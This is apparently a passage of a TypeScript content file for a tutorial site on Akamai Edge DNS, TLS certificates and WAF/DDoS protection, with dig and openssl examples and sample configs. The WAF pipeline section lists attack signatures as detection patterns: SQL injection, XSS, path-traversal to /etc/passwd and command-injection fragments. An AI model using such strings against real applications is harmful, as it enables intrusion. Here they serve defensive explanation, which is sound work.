import type { RichPageData } from "@/components/rich-detail/types";

export const akamaiPages: Record<string, RichPageData> = {
  "akamai-dns": {
    id: "akamai-dns",
    hero: {
      badge1: { label: "DNS", color: "accent" },
      title: "DNS & Edge DNS",
      subtitle: "Record Types, TTLs, Authoritative DNS",
      description: "DNS translates human-readable domain names into IP addresses. Akamai Edge DNS provides an authoritative DNS solution with global anycast distribution, DDoS protection, and sub-second propagation — critical for high-availability applications.",
      highlights: [
        { icon: "🌍", label: "Global Anycast", detail: "DNS queries answered from the nearest Akamai PoP" },
        { icon: "🛡️", label: "DDoS-Resilient", detail: "Distributed infrastructure absorbs volumetric attacks" },
        { icon: "⚡", label: "Sub-second Propagation", detail: "Zone changes visible globally in <1 second" },
        { icon: "🔒", label: "DNSSEC Built-in", detail: "Automated key rotation, cryptographic integrity" },
      ],
      mentalModel: "DNS is the internet's phone book — but understanding the full resolution path is what separates a developer from a sysadmin. When you type www.example.com, your browser doesn't magically know the IP. It asks a recursive resolver (your ISP's DNS server, or 8.8.8.8 / 1.1.1.1) to do the heavy lifting. That resolver systematically walks a hierarchy: root servers → TLD servers → authoritative nameservers, caching each answer along the way. With Akamai Edge DNS, the authoritative nameservers are distributed across 1000+ PoPs globally, answering queries from the nearest anycast location. The IP returned may point directly to an Akamai CDN edge server — meaning the user's browser connects to a nearby cache, not your distant origin.",
    },
    architecture: {
      sectionLabel: "DNS Resolution",
      title: "How a DNS Query Resolves — The Complete Flow",
      description: "Here's the real, complete flow — step by step — including where caching happens to make it fast in real life. This is what actually happens when you type www.example.com and press Enter.",
      pipeline: [
        { label: "1. Browser / OS Stub Resolver", description: "You type www.example.com → the OS stub resolver needs an IP. It sends a DNS query: 'What is the A/AAAA record for www.example.com?'", badgeColor: "muted" },
        { label: "2. Recursive Resolver (the key middleman)", description: "This is NOT your router. It is your ISP's DNS server (assigned via DHCP) or a public resolver you configured (8.8.8.8, 1.1.1.1). It does all the chasing for you.", badgeColor: "muted" },
        { label: "3. Cache Check", description: "The recursive resolver first checks its own cache. If it recently resolved www.example.com for anyone, it returns the IP immediately (<10ms). If not cached → it starts the full lookup.", badgeColor: "muted" },
        { label: "4. Root Nameserver", description: "~13 root server clusters worldwide (Verisign, NASA, universities, etc.). The resolver asks: 'Who handles .com?' Root answers: 'Here are the .com TLD nameserver IPs (a.gtld-servers.net, etc.)'", badgeColor: "muted" },
        { label: "5. TLD Nameserver (.com)", description: "The resolver asks a .com TLD server: 'Who is authoritative for example.com?' TLD answers: 'The authoritative nameservers are ns1.example.com (often Akamai, Cloudflare, Route 53, etc.)'", badgeColor: "muted" },
        { label: "6. Authoritative Nameserver", description: "The resolver contacts the domain's own nameserver (e.g., Akamai Edge DNS): 'What is the A/AAAA for www.example.com?' It replies with the actual IP(s), or a CNAME alias → requiring another lookup.", badge: "Akamai", badgeColor: "accent" },
        { label: "7. IP Returned + Cached", description: "The recursive resolver sends the IP back to your browser/OS. It also caches the result based on TTL (Time to Live) set by the domain owner — minutes to hours.", badgeColor: "muted" },
        { label: "8. Browser Connects", description: "Now the browser makes a real TCP connection (HTTPS) to the resolved IP — which could be your origin server directly, or a CDN edge server (Akamai, Cloudflare, Fastly) that proxies to your origin.", badgeColor: "accent" },
      ],
    },
    concepts: [
      { title: "The Recursive Resolver — The Unsung Hero", content: "The recursive resolver is the most important piece most developers overlook. It is the 'middleman' that does all the hard work. When your browser asks 'what is the IP for www.example.com?', it sends that question to the recursive resolver — which then walks the entire DNS hierarchy (root → TLD → authoritative) on your behalf. Crucially, it caches every answer it gets, so the next person asking for the same domain gets an instant response. This is why DNS feels 'instant' in practice: someone else already resolved it recently. Common recursive resolvers: your ISP's default (auto-configured via DHCP), Google Public DNS (8.8.8.8 / 8.8.4.4), Cloudflare (1.1.1.1), Quad9 (9.9.9.9)." },
      { title: "Caching — Why DNS Is Actually Fast", content: "In the real world, the full 8-step resolution almost never happens. Here is why: (1) Browser cache: Chrome/Firefox cache DNS for 60 seconds independently. (2) OS cache: your OS has its own DNS cache (check with ipconfig /displaydns on Windows). (3) Recursive resolver cache: your ISP's resolver serves millions of users — odds are someone already resolved google.com recently. (4) Each DNS response includes a TTL (Time to Live) that tells caches how long to keep the answer. Short TTL (60-300s): fast failover, but more queries and slower for cold users. Long TTL (3600-86400s): faster resolution for everyone, but slow propagation when you change records. Best practice: long TTLs for stable records, temporarily lower TTLs before planned changes, restore after." },
      { title: "CNAME Chasing — When One Lookup Becomes Two (or More)", content: "Sometimes the authoritative nameserver does not return an IP directly. Instead it returns a CNAME (alias): www.example.com → edge-lb-123.akamaiedge.net. Here is the critical thing most people get wrong: the recursive resolver (your ISP's DNS, Google 8.8.8.8, Cloudflare 1.1.1.1, etc.) is the one responsible for following that alias — and any chain of aliases — until it finds an actual IP address (A or AAAA record). The authoritative server does NOT automatically follow the chain for you. It just says 'this name is an alias for that name' and hands it back. The recursive resolver then starts a brand new lookup for the alias target, potentially walking root → TLD → authoritative all over again. This is why long CNAME chains add real latency — each hop is another full resolution. In CDN setups, CNAMEs are standard: your www points to a CDN hostname, which resolves to the nearest edge IP. Akamai's CNAME chain typically looks like: www.example.com → www.example.com.edgekey.net → e12345.dscx.akamaiedge.net → final edge IP. That is 2-3 extra resolutions the recursive resolver must chase." },
      { title: "Record Types — The Full Picture", content: "A records map domains to IPv4 addresses. AAAA records map to IPv6. CNAME records alias one domain to another (www → example.com.edgekey.net). MX records direct email to mail servers (with priority numbers). TXT records hold metadata — SPF (email sender verification), DKIM (email signatures), domain verification tokens. NS records delegate authority for a zone to specific nameservers. SOA records define zone parameters (serial number, refresh intervals, TTLs, admin email). SRV records specify service locations (used by protocols like SIP, LDAP). HTTPS/SVCB records (modern) advertise that a domain supports HTTP/2 or HTTP/3 and provide connection parameters upfront, reducing round trips." },
      { title: "Authoritative vs. Recursive DNS — Know the Difference", content: "This is the #1 confusion in DNS. Authoritative DNS servers are the 'source of truth' for a zone — they hold and serve the actual records. You (or your DNS provider like Akamai Edge DNS) configure records on authoritative servers. Recursive resolvers (like 8.8.8.8 or your ISP's server) query authoritative servers on behalf of clients and cache the results. They do not store records — they discover and cache them. Analogy: Authoritative DNS = the library that owns the books. Recursive resolver = the librarian who finds and fetches books for you (and remembers where they are for next time)." },
      { title: "DNSSEC — Cryptographic Trust Chain", content: "DNS Security Extensions (DNSSEC) adds cryptographic signatures to DNS records, preventing spoofing and cache poisoning. Without DNSSEC, a malicious resolver could return fake IPs (DNS hijacking). The chain of trust mirrors the DNS hierarchy: root zone signs → .com TLD signs → your zone signs. Each level validates the next level's keys using DS (Delegation Signer) records. Akamai Edge DNS supports DNSSEC with automated key rotation — you enable it, and Akamai handles the DNSKEY, RRSIG, and DS record management." },
      { title: "Zone Apex (Naked Domain) Problem", content: "The zone apex (example.com without 'www') cannot use a CNAME per RFC 1034 — because a CNAME means 'this name is an alias, ignore all other records for it', which conflicts with the SOA and NS records that MUST exist at the apex. This is a real problem for CDN setups where you want example.com → akamai-edge.net. Solutions: (1) Use an A record pointing directly to Akamai IPs (but IPs can change). (2) Akamai's ALIAS/ANAME record — a non-standard extension that resolves a CNAME at query time and returns an A record to the client. (3) Cloudflare calls this 'CNAME flattening.' All solve the same problem differently." },
      { title: "Anycast — Same IP, Multiple Locations", content: "Anycast is the networking technique that makes global DNS fast. The same IP address is announced (via BGP) from hundreds of locations worldwide. When you send a DNS query to an anycast IP, BGP routing delivers it to the nearest announcing location automatically. This is how root servers work (13 'logical' servers, but ~1500 actual instances globally), and it is how Akamai Edge DNS achieves global coverage from 1000+ PoPs. Anycast also provides natural DDoS resilience — attack traffic is distributed across all announcing locations instead of hitting a single server." },
    ],
    comparisons: [
      {
        title: "Standard DNS vs. Edge DNS",
        description: "Why organizations move from traditional DNS to Akamai's Edge DNS.",
        items: [
          { icon: "🏢", label: "Standard DNS (Registrar)", description: "Basic DNS hosting from your domain registrar.", points: ["2-4 nameservers in limited locations", "No DDoS protection — a single attack can take down DNS", "TTL propagation: minutes to hours for changes", "Manual record management via web UI", "No SLA guarantee typically"] },
          { icon: "🚀", label: "Akamai Edge DNS", description: "Enterprise authoritative DNS on Akamai's global network.", points: ["1000+ PoPs with anycast — queries answered from nearest location", "Built-in DDoS absorption (volumetric, protocol) across global capacity", "Sub-second propagation across the entire network", "API-driven record management + Terraform provider", "100% uptime SLA backed contractually"] },
        ],
      },
    ],
    codeExamples: [
      { title: "dig — Trace the Full DNS Resolution Path", language: "bash", code: `# The most useful DNS debugging command: +trace
# This shows you EXACTLY which servers are queried at each step
$ dig www.example.com +trace

; <<>> DiG 9.18.1 <<>> www.example.com +trace
;; global options: +cmd
.                       86400   IN      NS      a.root-servers.net.
.                       86400   IN      NS      b.root-servers.net.
;; Received 239 bytes from 127.0.0.53#53 (local resolver)

com.                    172800  IN      NS      a.gtld-servers.net.
com.                    172800  IN      NS      b.gtld-servers.net.
;; Received 828 bytes from 198.41.0.4#53 (a.root-servers.net)
;; ↑ Step 4: Root server says ".com is handled by gtld-servers"

example.com.            172800  IN      NS      a1-123.akam.net.
example.com.            172800  IN      NS      a2-456.akam.net.
;; Received 264 bytes from 192.5.6.30#53 (a.gtld-servers.net)
;; ↑ Step 5: .com TLD says "example.com is handled by akam.net"

www.example.com.        300     IN      CNAME   www.example.com.edgekey.net.
;; Received 86 bytes from 23.61.199.1#53 (a1-123.akam.net)
;; ↑ Step 6: Akamai Edge DNS returns CNAME (alias)
;; Now the resolver must chase this CNAME...

# Query specific record types:
$ dig www.example.com A +short        # IPv4 address
203.0.113.50

$ dig www.example.com AAAA +short     # IPv6 address  
2001:db8::1

$ dig example.com MX +short           # Mail servers
10 mail1.example.com.
20 mail2.example.com.

$ dig example.com TXT +short          # SPF, DKIM, verification
"v=spf1 include:_spf.google.com ~all"

$ dig example.com NS +short           # Nameservers
a1-123.akam.net.
a2-456.akam.net.` },
      { title: "Edge DNS Zone File (Conceptual)", language: "text", code: `; Zone: example.com
; Hosted on Akamai Edge DNS
$TTL 3600

; SOA Record — defines zone parameters
@  IN  SOA  a1-123.akam.net. admin.example.com. (
    2024011501  ; Serial (increment on every change)
    3600        ; Refresh (how often secondaries check for updates)
    900         ; Retry (retry interval if refresh fails)
    604800      ; Expire (how long secondaries serve stale data)
    300         ; Minimum TTL (negative caching TTL)
)

; NS Records — delegate authority to Akamai Edge DNS
@  IN  NS  a1-123.akam.net.
@  IN  NS  a2-456.akam.net.

; A Records — direct IP mappings
@      IN  A     203.0.113.50      ; Zone apex (naked domain)
api    IN  A     203.0.113.51      ; API server (direct to origin)

; CNAME Records — aliases (cannot be used at zone apex!)
www    IN  CNAME example.com.edgekey.net.   ; CDN via Akamai
shop   IN  CNAME shop.example.com.edgekey.net.

; MX Records — email routing (priority + server)
@      IN  MX  10  mail1.example.com.
@      IN  MX  20  mail2.example.com.

; TXT Records — metadata
@      IN  TXT  "v=spf1 include:_spf.google.com ~all"
dkim   IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0..."
_verify IN TXT  "akamai-verification=abc123"` },
    ],
    glossary: [
      { title: "DNS Terms", color: "accent", terms: [
        { term: "A Record", definition: "Maps domain to IPv4 address" },
        { term: "AAAA Record", definition: "Maps domain to IPv6 address" },
        { term: "CNAME", definition: "Canonical Name — aliases one domain to another. The recursive resolver is responsible for chasing the alias chain." },
        { term: "MX Record", definition: "Mail Exchange — directs email to mail servers with priority" },
        { term: "TXT Record", definition: "Text record for metadata (SPF, DKIM, domain verification)" },
        { term: "NS Record", definition: "Nameserver — delegates authority for a zone" },
        { term: "SOA", definition: "Start of Authority — defines zone parameters (serial, refresh, TTLs)" },
        { term: "TTL", definition: "Time to Live — how long resolvers cache a DNS answer (seconds)" },
        { term: "Anycast", definition: "Same IP announced from multiple global locations; nearest responds via BGP routing" },
        { term: "DNSSEC", definition: "Cryptographic signatures preventing DNS spoofing and cache poisoning" },
        { term: "Zone Apex", definition: "The naked domain (example.com) without any subdomain — cannot use CNAME" },
        { term: "Recursive Resolver", definition: "The middleman DNS server (e.g., 8.8.8.8) that chases the hierarchy and caches results on your behalf" },
        { term: "Stub Resolver", definition: "Your OS's built-in DNS client that sends queries to the recursive resolver" },
      ]},
    ],
    tips: [
      "Use short TTLs (60-300s) before planned DNS changes, then restore long TTLs after propagation — this is the standard change management practice",
      "Always set up both A and AAAA records for IPv6 support — it is increasingly important as IPv4 addresses are exhausted",
      "Use dig +trace to debug DNS resolution issues — it shows you the exact path through root → TLD → authoritative",
      "Enable DNSSEC on Edge DNS to prevent cache poisoning and man-in-the-middle attacks — Akamai handles key rotation automatically",
      "Remember: the recursive resolver chases CNAME chains, not the authoritative server. Long CNAME chains = more latency.",
    ],
    whenToUse: [
      "You need authoritative DNS with 100% uptime SLA and DDoS protection",
      "Global users require fast DNS resolution from nearby anycast PoPs",
      "DNS-based traffic management (failover, geo-routing) is needed",
      "DNSSEC is required for security compliance",
    ],
  },

  "akamai-tls": {
    id: "akamai-tls",
    hero: {
      badge1: { label: "TLS", color: "accent" },
      title: "HTTPS / TLS & Certificates",
      subtitle: "Handshake, Cert Types, Chain of Trust",
      description: "TLS (Transport Layer Security) encrypts data between browser and server. Understanding the TLS handshake, certificate types, and chain of trust is essential for configuring HTTPS on Akamai's CDN — where TLS termination happens at the edge.",
      highlights: [
        { icon: "🔒", label: "Edge TLS", detail: "TLS terminated at Akamai edge, not your origin" },
        { icon: "📜", label: "Certificate Management", detail: "DV, OV, EV certs with auto-renewal" },
        { icon: "⚡", label: "1-RTT Handshake", detail: "TLS 1.3 connects in a single round trip" },
        { icon: "🔄", label: "0-RTT Resumption", detail: "Returning visitors skip the handshake entirely" },
      ],
      mentalModel: "After DNS resolves to an Akamai edge IP, the very next thing that happens is the TLS handshake — before a single byte of your website loads. The browser and the edge server negotiate encryption. With Akamai, this handshake happens at the nearest edge server (not your distant origin), which is why it is fast. The edge server presents a certificate proving it is authorized to serve your domain. The browser validates that cert against a chain of trust (leaf cert → intermediate CA → root CA). If everything checks out, both sides compute a shared encryption key, and all subsequent data flows encrypted. On Akamai, you have two TLS connections: browser ↔ edge (public-facing, strong certs) and edge ↔ origin (internal, can be simpler or even HTTP).",
    },
    architecture: {
      sectionLabel: "TLS Handshake",
      title: "How a TLS 1.3 Connection Establishes — Step by Step",
      description: "Here is exactly what happens in the ~50ms between your browser getting the IP address and the first byte of your website loading. TLS 1.3 completes this in a single round trip (1-RTT), down from 2-RTT in TLS 1.2.",
      pipeline: [
        { label: "1. TCP Connection", description: "Browser opens a TCP connection to the Akamai edge IP (from DNS). This is the standard 3-way handshake: SYN → SYN-ACK → ACK. ~1 RTT. This happens BEFORE any TLS.", badgeColor: "muted" },
        { label: "2. Client Hello", description: "Browser sends: supported TLS versions (1.2, 1.3), supported cipher suites (AES-256-GCM, ChaCha20), a random number, the SNI hostname (www.example.com — unencrypted!), and key share material (ECDHE public key). In TLS 1.3, the key share is sent upfront (unlike 1.2 which waited).", badgeColor: "muted" },
        { label: "3. Server Hello + Certificate", description: "Akamai edge server responds with: chosen cipher suite (e.g., TLS_AES_256_GCM_SHA384), its own random number, its ECDHE public key share, the server certificate (proving it is authorized for www.example.com), and the certificate chain (leaf → intermediate). In TLS 1.3, this is all in ONE message.", badge: "Edge", badgeColor: "accent" },
        { label: "4. Browser Validates Certificate", description: "The browser checks: Is the cert expired? Does the domain match (CN or SAN)? Is the chain valid up to a trusted root CA in the browser's trust store? Has the cert been revoked (via OCSP stapling or CRL)? If ANY check fails → browser shows a scary warning page and refuses to connect.", badgeColor: "muted" },
        { label: "5. Key Derivation", description: "Both sides independently compute the same shared secret from their ECDHE key exchange. This uses elliptic curve math — each side has its private key + the other's public key, and the math produces the same result. This shared secret derives the actual encryption keys (separate keys for each direction).", badgeColor: "muted" },
        { label: "6. Finished Messages", description: "Both sides send encrypted 'Finished' messages to confirm the handshake succeeded. These messages include a hash of the entire handshake transcript, preventing tampering. At this point, the TLS connection is established.", badgeColor: "accent" },
        { label: "7. Application Data Flows", description: "The browser sends the HTTP request (GET /index.html) encrypted with the negotiated keys. The edge server decrypts, processes (serves from cache or forwards to origin), and sends the response encrypted. All subsequent data on this connection is encrypted.", badge: "Encrypted", badgeColor: "accent" },
        { label: "8. Session Resumption (0-RTT)", description: "For returning visitors, TLS 1.3 supports 0-RTT resumption: the browser caches a 'session ticket' from a previous connection and includes early application data in the very first message. The edge server can process this immediately — no handshake round trip needed. Caveat: 0-RTT data is vulnerable to replay attacks, so only safe for idempotent requests (GET, not POST).", badgeColor: "muted" },
      ],
    },
    visualBlocks: [
      { icon: "🤝", label: "TCP + TLS Handshake", description: "How a secure connection is established", items: ["TCP 3-way handshake (SYN → SYN-ACK → ACK)", "Client Hello (ciphers, SNI, key share)", "Server Hello + Certificate", "Key derivation → encrypted tunnel"] },
      { icon: "📜", label: "Certificates & Trust", description: "How the browser verifies server identity", items: ["DV (minutes) → OV (days) → EV (weeks)", "Chain: Leaf cert → Intermediate CA → Root CA", "OCSP Stapling for fast revocation checks", "Akamai CPS manages cert lifecycle"] },
      { icon: "⚡", label: "Performance", description: "Why TLS 1.3 is fast", items: ["1-RTT handshake (vs 2-RTT in TLS 1.2)", "0-RTT session resumption for repeat visits", "Only 5 secure cipher suites allowed", "Forward secrecy mandatory (ECDHE)"] },
    ],
    concepts: [
      { title: "Certificate Types — What They Actually Prove", content: "DV (Domain Validation): The CA only verifies you control the domain (via DNS TXT record or HTTP file challenge). Takes minutes. Shows a padlock, but the cert says nothing about WHO you are. Let's Encrypt issues these for free. This is what Akamai uses for managed certs. OV (Organization Validation): The CA verifies the organization legally exists (business registration, D&B lookup). Takes 1-3 days. The cert includes the org name in the subject, but browsers do not display it prominently. EV (Extended Validation): Rigorous verification — legal existence, physical address, phone verification, authorized requester. Takes 1-2 weeks. Used to show a green bar with the company name (browsers removed this in 2019). Still used for high-trust pages (banking, government) for compliance reasons. For CDN/edge use, DV is the standard and recommended choice." },
      { title: "Chain of Trust — How Browsers Decide to Trust Your Cert", content: "Your browser comes pre-installed with ~150 root CA certificates (maintained by Mozilla, Apple, Microsoft, Google). These are the ultimate trust anchors. When your site presents a certificate, the browser builds a chain: your leaf cert → signed by an intermediate CA → signed by a root CA. Each signature is verified cryptographically. If the chain reaches a trusted root → connection proceeds. Common failures: (1) Missing intermediate cert — your server only sends the leaf cert, browser cannot build the chain → 'untrusted' error. (2) Expired cert — any cert in the chain expired → error. (3) Domain mismatch — cert is for shop.example.com but you are visiting www.example.com → error. Akamai manages the full chain for you when using managed certificates." },
      { title: "SNI — Why One IP Can Serve Many HTTPS Sites", content: "In early HTTPS, every domain needed its own IP address because the server did not know which certificate to present until after the TLS handshake — but the TLS handshake needed the cert. Chicken-and-egg problem. SNI (Server Name Indication) solved this: the browser sends the requested hostname in the Client Hello message (step 2 above), BEFORE the server picks a cert. So the server reads the hostname and presents the right certificate. The catch: SNI sends the hostname in cleartext, so anyone watching can see which site you are visiting. ECH (Encrypted Client Hello) is the emerging fix. Akamai serves thousands of domains per edge IP using SNI." },
      { title: "Forward Secrecy — Why ECDHE Matters", content: "Without forward secrecy (old RSA key exchange): if an attacker records your encrypted traffic today and later steals the server's private key, they can decrypt ALL past traffic. With forward secrecy (ECDHE): each connection generates unique, ephemeral keys that are discarded after use. Even if the server's private key is compromised later, past sessions remain safe. TLS 1.3 mandates ECDHE (forward secrecy is required). TLS 1.2 allows both RSA (no forward secrecy) and ECDHE — always configure Akamai to prefer ECDHE cipher suites." },
      { title: "HSTS — Forcing HTTPS Forever", content: "HSTS (HTTP Strict Transport Security) is a response header that tells browsers: 'Never connect to this domain over plain HTTP again.' Once a browser sees this header, it automatically upgrades all future requests to HTTPS — even if the user types http://. The max-age directive says how long to remember this (typically 1 year = 31536000 seconds). The preload directive gets your domain added to a hardcoded list in Chrome/Firefox/Safari, so even first-time visitors use HTTPS. WARNING: If you enable HSTS preload and later need to go back to HTTP, you are stuck — removal from the preload list takes months." },
      { title: "OCSP Stapling — Faster Cert Validation", content: "When a browser validates your cert, it needs to check if the cert has been revoked. Two methods: (1) CRL (Certificate Revocation List): browser downloads a list of all revoked certs from the CA — slow, large files. (2) OCSP: browser asks the CA's OCSP server 'is this specific cert revoked?' — faster but adds a round trip and creates a privacy issue (the CA knows which sites you visit). OCSP Stapling: the SERVER (Akamai edge) periodically fetches the OCSP response and 'staples' it to the TLS handshake. The browser gets the revocation status immediately — no extra round trip, no privacy leak. Always enable OCSP stapling on Akamai." },
      { title: "Two TLS Connections — Edge vs. Origin", content: "When Akamai proxies your site, there are actually TWO separate TLS connections: (1) Browser to Akamai Edge: This is public-facing. Uses your domain's certificate (DV/OV/EV). Must be strong (TLS 1.2+ minimum, strong ciphers, HSTS). Managed by Akamai CPS. (2) Akamai Edge to Your Origin: This is internal. Can use a different cert (even self-signed). Can even be plain HTTP if your origin does not support HTTPS (not recommended). The key insight: you can have world-class TLS on the edge even if your origin infrastructure is limited." },
    ],
    comparisons: [
      {
        title: "TLS 1.2 vs. TLS 1.3 — The Real Differences",
        description: "TLS 1.3 is not just 'newer' — it fundamentally changed how the handshake works, which ciphers are allowed, and what information is encrypted.",
        items: [
          { icon: "📦", label: "TLS 1.2 (2008)", description: "Widely supported, but showing its age.", points: ["2-RTT handshake: Client Hello → Server Hello + Cert → Client Key Exchange → Finished (2 full round trips)", "Supports legacy ciphers including insecure ones (RC4, 3DES, SHA-1, RSA key exchange)", "Forward secrecy is optional — RSA key exchange is still allowed (no forward secrecy)", "Server certificate sent in cleartext — anyone watching can see which cert", "Cipher suite negotiation is complex — 300+ possible combinations, many insecure", "Still required for some legacy clients (old Android, IoT devices, enterprise proxies)"] },
          { icon: "⚡", label: "TLS 1.3 (2018)", description: "Faster, simpler, secure by default.", points: ["1-RTT handshake: Client Hello (with key share) → Server Hello + Cert + Finished (1 round trip — 50% faster)", "Only 5 cipher suites allowed — all AEAD (AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305)", "Forward secrecy is MANDATORY — only ECDHE key exchange, RSA removed entirely", "Server certificate is ENCRYPTED — observers cannot see which cert is presented", "0-RTT resumption for returning visitors — application data in the very first packet", "Removed all insecure legacy features: compression, renegotiation, static RSA, RC4, SHA-1"] },
        ],
        tip: "Configure Akamai to prefer TLS 1.3 but allow TLS 1.2 fallback for older clients. Disable TLS 1.0 and 1.1 entirely — they have known vulnerabilities and are no longer PCI DSS compliant.",
      },
    ],
    codeExamples: [
      { title: "openssl — Inspect the Full TLS Handshake", language: "bash", code: `# Full TLS connection with certificate details
$ openssl s_client -connect www.example.com:443 -servername www.example.com

# What you will see (annotated):
# 1. Certificate chain (leaf -> intermediate -> root):
Certificate chain
 0 s:CN = www.example.com
   i:C = US, O = DigiCert Inc, CN = DigiCert SHA2 EV CA
 1 s:C = US, O = DigiCert Inc, CN = DigiCert SHA2 EV CA
   i:C = US, O = DigiCert Inc, CN = DigiCert Global Root CA

# 2. Certificate details:
Server certificate:
  subject: CN = www.example.com
  issuer:  DigiCert SHA2 EV Server CA
  notBefore: Jan  1 00:00:00 2024 GMT
  notAfter:  Dec 31 23:59:59 2024 GMT

# 3. TLS session details:
SSL-Session:
  Protocol  : TLSv1.3
  Cipher    : TLS_AES_256_GCM_SHA384

# Test specific TLS versions:
$ openssl s_client -connect www.example.com:443 -tls1_3
$ openssl s_client -connect www.example.com:443 -tls1_2
$ openssl s_client -connect www.example.com:443 -tls1_1  # Should FAIL

# Check certificate expiration:
$ echo | openssl s_client -connect www.example.com:443 2>/dev/null | \\
  openssl x509 -noout -dates` },
      { title: "Akamai CPS + Property TLS Configuration", language: "json", code: `{
  "enrollment": {
    "id": "cps-enrollment-12345",
    "certificateType": "dv",
    "sans": ["www.example.com", "shop.example.com", "api.example.com"],
    "autoRenewal": true,
    "networkConfiguration": {
      "geography": "core",
      "sniOnly": true
    }
  },
  "property": {
    "hostname": "www.example.com",
    "tlsSettings": {
      "minimumVersion": "TLSv1.2",
      "preferredCiphers": [
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384"
      ],
      "ocspStapling": true,
      "hsts": {
        "enabled": true,
        "maxAge": 31536000,
        "includeSubdomains": true,
        "preload": true
      }
    },
    "originTls": {
      "hostname": "origin.example.com",
      "port": 443,
      "verifyOriginCert": true,
      "allowSelfSigned": false
    }
  }
}` },
    ],
    glossary: [
      { title: "TLS & Certificate Terms", color: "accent", terms: [
        { term: "TLS", definition: "Transport Layer Security — protocol for encrypting data in transit. Successor to SSL." },
        { term: "Certificate", definition: "Digital document proving a server's identity. Contains public key, domain, issuer, expiration." },
        { term: "CA", definition: "Certificate Authority — trusted entity that issues and signs certificates (DigiCert, Let's Encrypt)" },
        { term: "DV / OV / EV", definition: "Domain, Organization, Extended Validation — increasing levels of identity verification" },
        { term: "Chain of Trust", definition: "Leaf cert → intermediate CA → root CA. Browser walks this chain to verify trust." },
        { term: "SNI", definition: "Server Name Indication — hostname sent in Client Hello, allowing one IP to serve multiple HTTPS sites" },
        { term: "ECDHE", definition: "Elliptic Curve Diffie-Hellman Ephemeral — key exchange algorithm providing forward secrecy" },
        { term: "Forward Secrecy", definition: "Past sessions cannot be decrypted even if the server's private key is later compromised" },
        { term: "HSTS", definition: "HTTP Strict Transport Security — header telling browsers to always use HTTPS" },
        { term: "OCSP Stapling", definition: "Server pre-fetches cert revocation status and includes it in the TLS handshake" },
        { term: "0-RTT", definition: "Zero round-trip resumption — returning TLS 1.3 visitors send data immediately" },
        { term: "AEAD", definition: "Authenticated Encryption with Associated Data — cipher mode that encrypts AND authenticates" },
        { term: "CPS", definition: "Certificate Provisioning System — Akamai's cert management platform" },
      ]},
    ],
    tips: [
      "Enable HSTS with preload to force HTTPS — but be 100% sure you will never need plain HTTP again",
      "Always enable OCSP stapling on Akamai — eliminates an extra round trip during cert validation",
      "Akamai manages cert renewal automatically for DV certs — set it and forget it, but monitor alerts",
      "Test your TLS configuration with SSL Labs (ssllabs.com/ssltest) — aim for an A+ rating",
      "Remember there are TWO TLS connections (browser-edge and edge-origin) — make sure both are configured",
      "Disable TLS 1.0 and 1.1 — they are not PCI DSS compliant and have known vulnerabilities",
    ],
    whenToUse: [
      "You need to configure HTTPS for a site served through Akamai CDN",
      "Debugging 'certificate not trusted' errors — check the chain of trust and intermediate cert",
      "Choosing between DV, OV, and EV certificates — DV for most sites, EV only for compliance",
      "Optimizing TLS performance — TLS 1.3 for 1-RTT, 0-RTT for returning visitors, OCSP stapling",
    ],
  },

  "akamai-waf": {
    id: "akamai-waf",
    hero: {
      badge1: { label: "WAF", color: "accent" },
      title: "WAF & DDoS Protection",
      subtitle: "Rules, Tuning, Rate Control",
      description: "Akamai's Web Application Firewall (App & API Protector) inspects HTTP/HTTPS traffic at the edge, blocking attacks like SQL injection, XSS, and DDoS before they reach your origin — all while minimizing false positives through adaptive tuning.",
      highlights: [
        { icon: "🛡️", label: "Edge Protection", detail: "Attacks blocked at the CDN layer, not your origin" },
        { icon: "🤖", label: "Adaptive Rules", detail: "ML-assisted rule tuning reduces false positives" },
        { icon: "📊", label: "1.3+ Tbps Capacity", detail: "Absorbs the largest volumetric DDoS attacks" },
        { icon: "🔍", label: "Layer 3-7 Coverage", detail: "Network floods to application-level attacks" },
      ],
      mentalModel: "Think of the WAF as a highly trained security guard at the front door — which is the Akamai edge, NOT your origin server. Every single HTTP request passes through this guard before your server ever sees it. The guard has a checklist: Is this IP known to be malicious? Is this client sending too many requests too fast? Does the request body contain attack patterns like SQL injection or XSS? If any check fails, the request is blocked right there at the edge — your origin never knows it happened. The hardest part of running a WAF is not turning it on — it is TUNING it. Every application is different. A request that looks like SQL injection to the WAF might be a perfectly legitimate search query. This is why you always deploy in Alert mode first, watch the logs, add exceptions for your app's patterns, then gradually switch to Deny mode.",
    },
    architecture: {
      sectionLabel: "Protection Pipeline",
      title: "How WAF Processes Every Request — Layer by Layer",
      description: "When a request arrives at the Akamai edge, it does not just hit 'the WAF' — it passes through multiple distinct security layers in sequence. Each layer catches different attack types. Understanding this order matters for debugging why a request was blocked.",
      pipeline: [
        { label: "1. Request Arrives at Edge", description: "The HTTP/HTTPS request arrives at the nearest Akamai edge PoP. TLS is already terminated (see TLS topic). The WAF now sees the full decrypted HTTP request: method, URI, headers, cookies, query parameters, and body.", badgeColor: "muted" },
        { label: "2. IP Reputation Check", description: "First check: Is this client IP in Akamai's threat intelligence database? Akamai tracks billions of requests/day and maintains reputation scores. Known scanners, botnets, and attack sources get flagged immediately — the WAF does not even bother inspecting the payload.", badge: "WAF", badgeColor: "accent" },
        { label: "3. Network-Layer DDoS", description: "For volumetric attacks (SYN floods, UDP amplification, DNS reflection), Akamai's network absorbs the traffic across its 1.3+ Tbps global capacity. This happens at Layer 3/4 BEFORE the request reaches the application WAF. Most customers never see these attacks.", badge: "DDoS", badgeColor: "accent" },
        { label: "4. Rate Controls", description: "Is this client sending too many requests too fast? Rate controls check request frequency per client IP, session, or custom key. If an IP sends 100 requests/second to /api/login, it is almost certainly credential stuffing — not a human. Rate controls catch Layer 7 DDoS and brute-force.", badge: "WAF", badgeColor: "accent" },
        { label: "5. WAF Rule Engine (Attack Groups)", description: "The actual payload inspection: the WAF parses the full HTTP request and runs it through attack group rule sets. SQLi looks for ' OR 1=1, UNION SELECT. XSS looks for <script>, onerror=. LFI looks for ../../etc/passwd. Command Injection looks for ; ls, | cat. Rules have sensitivity levels (low/medium/high).", badge: "WAF", badgeColor: "accent" },
        { label: "6. Custom Rules", description: "After standard rules, your custom rules execute: geographic restrictions (block countries), URI path protection (only allow /admin from internal IPs), header validation (require API keys), request body size limits, and custom regex patterns.", badge: "Custom", badgeColor: "accent" },
